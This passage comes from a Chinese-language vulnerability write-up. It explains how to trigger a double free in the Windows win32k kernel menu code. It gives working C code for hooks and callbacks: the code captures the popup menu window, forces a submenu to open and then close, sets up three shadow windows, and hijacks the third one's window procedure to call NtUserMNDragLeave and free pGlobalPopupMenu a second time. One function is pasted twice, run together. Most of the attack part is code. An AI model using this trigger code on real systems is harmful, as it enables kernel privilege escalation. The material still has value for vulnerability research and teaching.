        tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;
        if (cwp->message != WM_NCCREATE)
        {
            return CallNextHookEx(0, code, wParam, lParam);
        }
        WCHAR szTemp[0x20] = { 0 };
        GetClassNameW(cwp->hwnd, szTemp, 0x14);
        if (!wcscmp(szTemp, L"#32768"))
        {
            hwndMenuHit = cwp->hwnd;
        }
        // 第一次释放只需要用到上述部分，其余部分后面会补充的
        return CallNextHookEx(0, code, wParam, lParam);
    }
首先判断当前处理的消息是否为WM_NCCREATE消息，不是的话就直接返回。接着再判断类名称是否为#32768，是的话表示这就是`TrackPopupMenuEx`函数创建的菜单窗口对象，将其句柄保存起来。
    static UINT  iMenuCreated = 0;
    VOID CALLBACK
    xxWindowEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD         event,
        HWND          hwnd,
        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        if (++iMenuCreated >= 2)
        {
            // 向子菜单发送 MN_ENDMENU 以关闭整个菜单
            SendMessageW(hwnd, MN_ENDMENU, 0, 0);
        }
        else
        {
            SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
        }
    }VOID CALLBACK
    xxWindowEventProc(
        HWINEVENTHOOK hWinEventHook,
        DWORD         event,
        HWND          hwnd,
        LONG          idObject,
        LONG          idChild,
        DWORD         idEventThread,
        DWORD         dwmsEventTime
    )
    {
        if (++iMenuCreated >= 2)
        {
            // 向子菜单发送 MN_ENDMENU 以关闭整个菜单
            SendMessageW(hwnd, MN_ENDMENU, 0, 0);
        }
        else
        {
            // 在 32 位系统中，参数 lParam 是一个 DWORD 类型的数值，其高低 16 位分别代表横坐标和纵坐标的相对位置，传入的数值需要确保相对坐标位于先前创建菜单时设定的子菜单项的位置。参数 wParam 设定用户按下的是左键还是右键，设置为 1 表示 MK_LBUTTON 左键。
            SendMessageW(hwnd, WM_LBUTTONDOWN, 1, 0x00020002); // (2,2)
        }
    }
在内核函数`xxxTrackPopupMenuEx`中处理完成对根弹出菜单窗口对象的创建时，系统调用`xxxWindowEvent`函数以发送代表“菜单弹出开始”的
EVENT_SYSTEM_MENUPOPUPSTART
事件通知。这将进入我们先前设置的自定义事件通知处理函数`xxWindowEventProc`中。每当进入该事件通知处理程序时，代表当前新的弹出菜单已显示在屏幕中。iMenuCreated用来计数，第一次进入`xxWindowEventProc`函数的时候，表示根弹出菜单已经在屏幕中显示，直接调用
`SendMessage`函数向参数句柄hwnd指向的菜单窗口对象发送WM_LBUTTONDOWN鼠标左键按下的消息，并在参数lParam传入按下的相对坐标。当消息处理函数
`xxxMenuWindowProc`
接收到该消息时，会调用`xxxMNOpenHierarchy`函数创建新的子菜单的相关对象，在这里完成新的子菜单在屏幕中的显示时，函数
`xxxMNOpenHierarchy` 调用函数 `xxxWindowEvent` 发送 EVENT_SYSTEM_MENUPOPUPSTART
事件通知。这使得执行流再次进入自定义事件通知处理函数 `xxWindowEventProc`
中。第二次进入此函数时，表示弹出的子菜单已经显示了，此时发送MN_ENDMENU消息来销毁窗口，导致执行`xxxEndMenuState`函数，从而执行第一次释放，即`MNFreePopup(pMenuState->pGlobalPopupMenu)`。  
至于为什么要设置WM_LBUTTONDOWN，是因为我们接下来要利用uButtonDownHitArea成员域，该成员域存储着当前鼠标按下的区域所属的窗口对象地址，当鼠标按键抬起时系统解锁并置零该成员域。因此，为了让他存储合法的窗口对象的地址，我们需要发送WM_LBUTTONDOWN鼠标左键按下的消息。
## 第二次释放
在我们对BSOD分析的时候就知道了，第二次释放是利用了阴影窗口的机制，在释放uButtonDownHitArea会同时消除与该对象关联的阴影窗口对象，因为他并没有属于自己的窗口消息处理函数，所以我们如果将窗口对象的消息处理函数修改为我们自定义的消息处理函数，就可以再一次的取得控制权。但是目前为止我们只完成了第一次释放，在释放uButtonDownHitArea的时候并不能达成我们的目的，因为我们还没有构建阴影窗口和hook消息处理函数，这两个步骤都需要我们在`xxWindowHookProc`函数中进行操作，也就是刚刚分析`xxWindowHookProc`函数时省略的内容，现在放出完整版本的函数：
    static UINT iShadowCount = 0;
    // 弹出窗口和阴影窗口创建时都会调用到这个函数
    LRESULT CALLBACK
    xxWindowHookProc(INT code, WPARAM wParam, LPARAM lParam)
    {
        tagCWPSTRUCT* cwp = (tagCWPSTRUCT*)lParam;
        if (cwp->message != WM_NCCREATE)
        {
            return CallNextHookEx(0, code, wParam, lParam);
        }
        WCHAR szTemp[0x20] = { 0 };
        GetClassNameW(cwp->hwnd, szTemp, 0x14);
        if (!wcscmp(szTemp, L"#32768"))
        {
            hwndMenuHit = cwp->hwnd;
        }
        // 前面已经分析过了，这里着重看后面的部分
        if (!wcscmp(szTemp, L"SysShadow") && hwndMenuHit != NULL)
        {
            iShadowCount++;
            if (iShadowCount == 3)
            {
                // cwp -> hwnd : 第三个阴影窗口
                // GWL_WNDPROC : 设置一个新的消息处理函数
                SetWindowLongW(cwp->hwnd, GWL_WNDPROC, (LONG)xxShadowWindowProc);
            }
            else
            {
                // 对刚刚保存的窗口句柄先隐藏再关闭就可以再次创建阴影窗口
                SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_HIDEWINDOW);
                SetWindowPos(hwndMenuHit, NULL, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_NOZORDER | SWP_SHOWWINDOW);
            }
        }
        return CallNextHookEx(0, code, wParam, lParam);
    }
前面对`xxxMNEndMenuState`函数的分析中已经说过了，在目标菜单窗口对象创建完成并成功显示时，系统为该窗口对象创建关联的类型为
`SysShadow` 的阴影窗口对象。同样地，创建阴影窗口对象并发送 WM_NCCREATE 消息时，系统也会调用 `xxxCallHook`
函数来分发调用挂钩程序，所以我们可以在`xxWindowHookProc`函数中进行对阴影窗口消息处理函数的hook。至于为什么要像代码中设置三个阴影窗口，我们需要先了解一下终止菜单时的一些机制。
    LABEL_227: // EndMenu
      xxxEndMenuLoop(menuState, menuState->pGlobalPopupMenu);
      if ( menuState->flags & 0x100 )
        xxxMNEndMenuState(1);
      return 0;
消息处理函数 `xxxMenuWindowProc`
接收到MN_ENDMENU消息及菜单对象是非模态时，会在`xxxMNEndMenuState`函数被调用之前调用`xxxEndMenuLoop`函数，该函数最终会调用`xxxDestroyWindow`函数和`xxxFreeWindow`函数销毁弹出的子菜单的窗口对象，这两个函数都会调用`xxxRemoveShadow`函数来释放阴影窗口对象，如果只有一个阴影窗口的话，应该是第一次释放成功，第二次发现存储阴影窗口的链表中无法查到有效节点而返回。  
也就是说，在我们进行第一次释放的时候，我们的窗口关联的阴影对象链表中的节点已经被释放了两次，又因为我们要马不停蹄的进行下一次释放来调用我们自己设置的消息处理程序，所以我们必须要早早设置三个阴影窗口对象，并且将第三个阴影窗口的消息处理程序hook掉，这样就能在第一次释放之后处理uButtonDownHitArea时再次获得控制权。
    LRESULT WINAPI
    xxShadowWindowProc(
        _In_ HWND   hwnd,
        _In_ UINT   msg,
        _In_ WPARAM wParam,
        _In_ LPARAM lParam
    )
    {
        if (msg == WM_NCDESTROY)
        {
            xxSyscall(num_NtUserMNDragLeave, 0, 0);
        }
        return DefWindowProcW(hwnd, msg, wParam, lParam);
    }
判断传入的消息是否为WM_NCDESTROY，如果是的话就调用`NtUserMNDragLeave`函数，该函数同样可以调用`xxxMNEndMenuState`函数：
    /***************************************************************************\
    * xxxUnlockMenuState
    *
    * 11/24/96 GerardoB      Created
    \***************************************************************************/
    BOOL xxxUnlockMenuState (PMENUSTATE pMenuState)
    {
        UserAssert(pMenuState->dwLockCount != 0);
        (pMenuState->dwLockCount)--;
        if ((pMenuState->dwLockCount == 0) && ExitMenuLoop(pMenuState, pMenuState->pGlobalPopupMenu)) {
            xxxMNEndMenuState(TRUE);
            return TRUE;
        }
        return FALSE;
    }
继续调用`xxxMNEndMenuState`函数就意味着会再次执行`MNFreePopup(pMenuState->pGlobalPopupMenu);`，上一个`xxxMNEndMenuState`函数中pGlobalPopMenu刚刚被释放过，现在再释放一次，自然造成了Double
Free。  
# exp分析